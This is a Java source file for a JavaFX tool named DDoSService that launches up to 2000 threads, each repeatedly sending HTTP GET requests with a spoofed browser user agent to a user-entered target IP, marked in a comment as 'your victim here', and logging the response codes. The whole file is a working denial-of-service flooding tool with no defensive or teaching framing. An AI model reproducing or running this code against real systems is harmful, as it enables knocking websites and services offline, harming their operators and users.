package software.service;

import javafx.scene.control.TextArea;
import software.utils.FileUtil;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.concurrent.atomic.AtomicBoolean;

public class DDoSService implements Runnable {
    private static String desIP;
    private static TextArea textArea;
    private static boolean threadStop = false;
    // private static ArrayList<String> list = new ArrayList<>();
    // private static int num;

    public void setDesIP(String desIP) {
        DDoSService.desIP = desIP;
    }

    public void setTextArea(TextArea textArea) {
        DDoSService.textArea = textArea;
    }

    public void setThreadStop(boolean threadStop) {
        DDoSService.threadStop = threadStop;
    }

    @Override
    public void run() {
        for (int i = 0; i < 2000; i++) {
            if (threadStop) {
                break;
            }
            DdosThread thread = null;
            try {
                thread = new DdosThread();
            } catch (Exception e) {
                e.printStackTrace();
            }
            assert thread != null;
            thread.start();
        }
    }

    public static class DdosThread extends Thread {
        private final AtomicBoolean running = new AtomicBoolean(true);
        private final String request = "http://" + desIP; //your victim here
        private final URL url;

        String param;

        public DdosThread() throws Exception {
            url = new URL(request);
            param = "param1=" + URLEncoder.encode("87845", "UTF-8");
        }

        @Override
        public void run() {
            while (running.get()) {
                if (threadStop) {
                    break;
                }
                try {
                    attack();
                } catch (Exception ignored) {
                }

            }
        }

        public void attack() throws Exception {
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setRequestMethod("GET");
            connection.setRequestProperty("charset", "utf-8");
            connection.setRequestProperty("Host", this.request);
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 " +
                    "(Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("Content-Length", param);

            System.out.println(this + " " + connection.getResponseCode());
            String str = this + " " + connection.getResponseCode() + "\n";
            FileUtil.writeData(str, "DDoS.data", true);
            textArea.setText(FileUtil.readFile("DDoS.data").toString());

            connection.getInputStream();
        }
    }
}
